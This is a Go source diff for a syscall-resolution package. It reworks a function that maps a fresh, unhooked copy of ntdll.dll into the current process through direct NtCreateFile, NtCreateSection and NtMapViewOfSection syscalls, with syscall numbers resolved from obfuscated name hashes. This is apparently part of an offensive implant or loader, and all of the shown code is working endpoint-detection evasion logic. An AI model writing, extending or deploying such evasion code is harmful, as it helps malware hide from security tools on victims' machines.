@@ -3,7 +3,6 @@ package syscallresolve
 
 import (
 	"fmt"
-	"os"
 	"runtime"
 	"sync"
 	"time"
@@ -920,15 +919,14 @@ func LoadFreshNtdllCopy() (uintptr, error) {
 	var err error
 	
 	freshNtdllOnce.Do(func() {
-		// Use the absolute system path to ntdll.dll to ensure it works regardless of working directory
-		// %SystemRoot%\System32\ntdll.dll is the standard location
-		systemRoot := os.Getenv("SystemRoot")
-		if systemRoot == "" {
-			systemRoot = "C:\\Windows" // Fallback if SystemRoot env var is not available
+		// Use NT path format for ntdll.dll
+		// Try multiple possible paths for better reliability
+		possiblePaths := []string{
+			`\??\C:\Windows\System32\ntdll.dll`, // NT path 
+			`\SystemRoot\System32\ntdll.dll`,    // Another NT path format
+			`C:\Windows\System32\ntdll.dll`,     // Standard path (might not work in all contexts)
+			`ntdll.dll`,                         // Let the loader find it (simplest approach)
 		}
-		
-		systemDir := systemRoot + "\\System32\\ntdll.dll"
-		debug.Printfln("SYSCALLRESOLVE", "Using ntdll.dll from: %s\n", systemDir)
 		
 		// Initialize the syscall numbers we need
 		ntCreateFileHash := obf.GetHash("NtCreateFile")
@@ -942,110 +940,131 @@ func LoadFreshNtdllCopy() (uintptr, error) {
 		ntMapViewOfSectionSSN := GetSyscallNumberLegacy(ntMapViewOfSectionHash) 
 		ntCloseSSN := GetSyscallNumberLegacy(ntCloseHash)
 		
-		// Convert the path to a UNICODE_STRING
-		ntPathStr := StringToUTF16(systemDir)
-		
-		// Calculate UTF-16 string length properly (without direct indexing)
-		// More precisely calculate the length by measuring the actual UTF-16 encoded string
-		// We need to do this without indexing the *uint16 directly
-		actualLen := uint16(0)
-		ptr := unsafe.Pointer(ntPathStr)
-		for {
-			// Read the current UTF-16 character
-			if *(*uint16)(ptr) == 0 {
-				break // Found null terminator
+		// Try each path until one works
+		for _, path := range possiblePaths {
+			debug.Printfln("SYSCALLRESOLVE", "Attempting to map ntdll.dll from: %s\n", path)
+			
+			// Convert the path to a UNICODE_STRING
+			ntPathStr := StringToUTF16(path)
+			
+			// Calculate UTF-16 string length properly
+			actualLen := uint16(0)
+			ptr := unsafe.Pointer(ntPathStr)
+			for {
+				if *(*uint16)(ptr) == 0 {
+					break
+				}
+				actualLen += 2
+				ptr = unsafe.Pointer(uintptr(ptr) + 2)
 			}
-			actualLen += 2 // Count 2 bytes for each UTF-16 character
-			ptr = unsafe.Pointer(uintptr(ptr) + 2) // Move to next UTF-16 character
-		}
-		
-		objectName := NT_UNICODE_STRING{
-			Length:        actualLen,
-			MaximumLength: actualLen + 2, // Add space for null terminator
-			Buffer:        ntPathStr,
-		}
-		
-		// Create OBJECT_ATTRIBUTES structure
-		objAttr := NT_OBJECT_ATTRIBUTES{
-			Length:                   uint32(unsafe.Sizeof(NT_OBJECT_ATTRIBUTES{})),
-			RootDirectory:            0,
-			ObjectName:               &objectName,
-			Attributes:               OBJ_CASE_INSENSITIVE,
-			SecurityDescriptor:       0,
-			SecurityQualityOfService: 0,
-		}
-		
-		// Initialize IO_STATUS_BLOCK
-		var ioStatusBlock NT_IO_STATUS_BLOCK
-		
-		// Open the file
-		var fileHandle uintptr
-		status, _ := ExternalSyscall(ntCreateFileSSN,
-			uintptr(unsafe.Pointer(&fileHandle)),
-			GENERIC_READ,
-			uintptr(unsafe.Pointer(&objAttr)),
-			uintptr(unsafe.Pointer(&ioStatusBlock)),
-			0, // AllocationSize
-			FILE_ATTRIBUTE_NORMAL,
-			FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
-			OPEN_EXISTING,
-			0, // CreateOptions
-			0, // EaBuffer
-			0, // EaLength
-		)
-		
-		if status != STATUS_SUCCESS {
-			debug.Printfln("SYSCALLRESOLVE", "NtCreateFile failed with status: 0x%X\n", status)
-			err = fmt.Errorf("failed to open ntdll.dll: 0x%X", status)
+			
+			objectName := NT_UNICODE_STRING{
+				Length:        actualLen,
+				MaximumLength: actualLen + 2,
+				Buffer:        ntPathStr,
+			}
+			
+			// Create OBJECT_ATTRIBUTES structure
+			objAttr := NT_OBJECT_ATTRIBUTES{
+				Length:                   uint32(unsafe.Sizeof(NT_OBJECT_ATTRIBUTES{})),
+				RootDirectory:            0,
+				ObjectName:               &objectName,
+				Attributes:               OBJ_CASE_INSENSITIVE,
+				SecurityDescriptor:       0,
+				SecurityQualityOfService: 0,
+			}
+			
+			// Initialize IO_STATUS_BLOCK
+			var ioStatusBlock NT_IO_STATUS_BLOCK
+			
+			// Open the file
+			var fileHandle uintptr
+			status, _ := ExternalSyscall(ntCreateFileSSN,
+				uintptr(unsafe.Pointer(&fileHandle)),
+				GENERIC_READ,
+				uintptr(unsafe.Pointer(&objAttr)),
+				uintptr(unsafe.Pointer(&ioStatusBlock)),
+				0, // AllocationSize
+				FILE_ATTRIBUTE_NORMAL,
+				FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+				OPEN_EXISTING,
+				0, // CreateOptions
+				0, // EaBuffer
+				0, // EaLength
+			)
+			
+			if status != STATUS_SUCCESS {
+				debug.Printfln("SYSCALLRESOLVE", "NtCreateFile failed for %s with status: 0x%X\n", path, status)
+				continue // Try next path
+			}
+			
+			// Successfully opened the file
+			debug.Printfln("SYSCALLRESOLVE", "Successfully opened %s\n", path)
+			
+			// Create a section for the file
+			var sectionHandle uintptr
+			status, _ = ExternalSyscall(ntCreateSectionSSN,
+				uintptr(unsafe.Pointer(&sectionHandle)),
+				SECTION_MAP_READ,
+				0, // ObjectAttributes
+				0, // MaximumSize
+				PAGE_READONLY,
+				SEC_IMAGE,
+				fileHandle,
+			)
+			
+			// Close the file handle as we don't need it anymore
+			ExternalSyscall(ntCloseSSN, fileHandle)
+			
+			if status != STATUS_SUCCESS {
+				debug.Printfln("SYSCALLRESOLVE", "NtCreateSection failed for %s with status: 0x%X\n", path, status)
+				continue // Try next path
+			}
+			
+			// Successfully created the section
+			debug.Printfln("SYSCALLRESOLVE", "Successfully created section for %s\n", path)
+			
+			// Map the section into memory
+			var baseAddress uintptr
+			var viewSize uintptr
+			status, _ = ExternalSyscall(ntMapViewOfSectionSSN,
+				sectionHandle,
+				uintptr(0xFFFFFFFFFFFFFFFF), // Current process
+				uintptr(unsafe.Pointer(&baseAddress)),
+				0, // ZeroBits
+				0, // CommitSize
+				0, // SectionOffset
+				uintptr(unsafe.Pointer(&viewSize)),
+				ViewShare,
+				0, // AllocationType
+				PAGE_READONLY,
+			)
+			
+			// Close the section handle as we don't need it anymore
+			ExternalSyscall(ntCloseSSN, sectionHandle)
+			
+			// STATUS_IMAGE_NOT_AT_BASE (0x40000003) is a warning, not an error
+			// It means the image was loaded at a different base address, which is fine
+			if status == 0x40000003 {
+				// This is a success case, just with a different base address
+				FreshNtdllBase = baseAddress
+				debug.Printfln("SYSCALLRESOLVE", "Mapped fresh ntdll.dll from %s at different base address: 0x%X, size: %d bytes\n", 
+					path, baseAddress, viewSize)
+				return
+			} else if status != STATUS_SUCCESS {
+				debug.Printfln("SYSCALLRESOLVE", "NtMapViewOfSection failed for %s with status: 0x%X\n", path, status)
+				continue // Try next path
+			}
+			
+			// Success! Store the base address and return
+			FreshNtdllBase = baseAddress
+			debug.Printfln("SYSCALLRESOLVE", "Successfully mapped fresh ntdll.dll from %s at: 0x%X, size: %d bytes\n", 
+				path, baseAddress, viewSize)
 			return
 		}
-		defer ExternalSyscall(ntCloseSSN, fileHandle)
 		
-		// Create a section for the file
-		var sectionHandle uintptr
-		status, _ = ExternalSyscall(ntCreateSectionSSN,
-			uintptr(unsafe.Pointer(&sectionHandle)),
-			SECTION_MAP_READ,
-			0, // ObjectAttributes
-			0, // MaximumSize
-			PAGE_READONLY,
-			SEC_IMAGE,
-			fileHandle,
-		)
-		
-		if status != STATUS_SUCCESS {
-			debug.Printfln("SYSCALLRESOLVE", "NtCreateSection failed with status: 0x%X\n", status)
-			err = fmt.Errorf("failed to create section for ntdll.dll: 0x%X", status)
-			return
-		}
-		defer ExternalSyscall(ntCloseSSN, sectionHandle)
-		
-		// Map the section into memory
-		var baseAddress uintptr
-		var viewSize uintptr
-		status, _ = ExternalSyscall(ntMapViewOfSectionSSN,
-			sectionHandle,
-			uintptr(0xFFFFFFFFFFFFFFFF), // Current process
-			uintptr(unsafe.Pointer(&baseAddress)),
-			0, // ZeroBits
-			0, // CommitSize
-			0, // SectionOffset
-			uintptr(unsafe.Pointer(&viewSize)),
-			ViewShare,
-			0, // AllocationType
-			PAGE_READONLY,
-		)
-		
-		if status != STATUS_SUCCESS {
-			debug.Printfln("SYSCALLRESOLVE", "NtMapViewOfSection failed with status: 0x%X\n", status)
-			err = fmt.Errorf("failed to map view of ntdll.dll: 0x%X", status)
-			return
-		}
-		
-		// Store the base address
-		FreshNtdllBase = baseAddress
-		debug.Printfln("SYSCALLRESOLVE", "Mapped fresh ntdll.dll at: 0x%X, size: %d bytes\n", 
-			baseAddress, viewSize)
+		// If we get here, all paths failed
+		err = fmt.Errorf("failed to map ntdll.dll from any path")
 	})
 	
 	if err != nil {
